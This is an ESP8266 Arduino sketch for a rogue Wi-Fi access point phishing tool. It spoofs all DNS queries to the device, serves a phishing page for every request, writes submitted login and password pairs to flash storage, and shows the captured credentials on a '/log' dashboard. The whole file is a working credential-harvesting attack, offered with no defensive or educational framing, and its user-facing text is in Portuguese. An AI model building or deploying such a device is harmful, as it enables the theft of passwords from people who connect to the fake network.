// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <FS.h>

// Include local libraries
#include "util.h"


// Gateway
IPAddress APIP(172, 0, 0, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

bool render(String path) {
  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    size_t sent =  webServer.streamFile(file, "text/html");
    file.close();
    return true;
  }
  err("File " + path + " not found.");
  return false;
}

/*
 * Save credentials sent by user
 */
String saveCredentials() {
  String credentials = webServer.arg("login") + "|" + webServer.arg("pass") + "\n";
  bool writeFileResult = writeFile(credentialsFile, credentials, true);
  if(writeFileResult) {
    return redirectHTML("/success");
  }
  else {
    return "<h1> Ocorreu um erro. Tente novamente! </h1>"; 
  }
}

/*
 * Show credentials captured
 */
String showCredentials()
{
  String credentials = readFile(credentialsFile);

  String _header = readFile("/dashboard/header.html");
  String _footer = readFile("/dashboard/footer.html");
  String _body = readFile("/dashboard/log.html");
  String _script = injectJS(credentials);

  String fullpage = _header + _script + _body + _footer;
  return fullpage;
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  SPIFFS.begin();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  // Start webserver
  dnsServer.start(53, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.begin();

  /*
   * Routes
   */
  webServer.on("/login",[]() {
    webServer.send(200, "text/html", saveCredentials());
  });

  webServer.on("/success",[]() {
    webServer.send(200, "text/html", readFile("/pages/success.html"));
  });

  webServer.on("/log",[]() {
    webServer.send(200, "text/html", showCredentials());
  });
  
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", readFile(phishingPage));
  });
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  delay(10);
}
